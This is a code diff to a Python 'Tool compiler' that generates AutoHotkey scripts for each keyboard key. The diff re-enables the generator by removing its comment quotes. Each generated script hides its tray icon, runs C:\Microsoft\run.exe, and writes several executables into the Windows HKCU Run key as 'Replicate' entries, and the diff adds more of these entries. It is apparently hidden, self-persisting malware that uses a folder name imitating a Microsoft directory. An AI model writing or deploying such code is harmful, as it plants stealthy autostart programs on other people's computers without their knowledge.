@@ -259,7 +259,7 @@ with open("output.txt", "w") as file:
 
 
 # Tool compiler
-"""
+
 letters = [
     'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p',
     'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l',
@@ -275,7 +275,7 @@ for letter in letters:
 
 $'''
     result += letter + r'''::{
-    path := "C:\microsoft"
+    path := "C:\Microsoft"
     Send "''' + letter + r'''"
 
     static lastRun := 0
@@ -313,16 +313,18 @@ for other in others:
     result = '''#SingleInstance Ignore
 #NoTrayIcon
 
-Run "C:\microsoft\\run.exe"
+Run "C:\Microsoft\\run.exe"
 
 $'''
     result += other + r'''::{
-    path := "C:\microsoft"
+    path := "C:\Microsoft"
     Send "{''' + other + r'''}"
-    RegWrite '"C:\microsoft\run.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate0"
-    RegWrite '"C:\microsoft\LButton.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate1"
-    RegWrite '"C:\microsoft\RButton.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate2"
-    RegWrite '"C:\microsoft\Delete.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate3"
+    RegWrite '"C:\Microsoft\run.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate0"
+    RegWrite '"C:\Microsoft\LButton.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate1"
+    RegWrite '"C:\Microsoft\RButton.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate2"
+    RegWrite '"C:\Microsoft\Delete.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate3"
+    RegWrite '"C:\Microsoft\Backspace.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate4"
+    RegWrite '"C:\Microsoft\Space.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate5"
 
     static lastRun := 0
     delay := 1000
@@ -353,4 +355,3 @@ $'''
 
     with open("../Public-AHK/" + other + ".ahk", "w") as file:
         file.write(result)
-"""
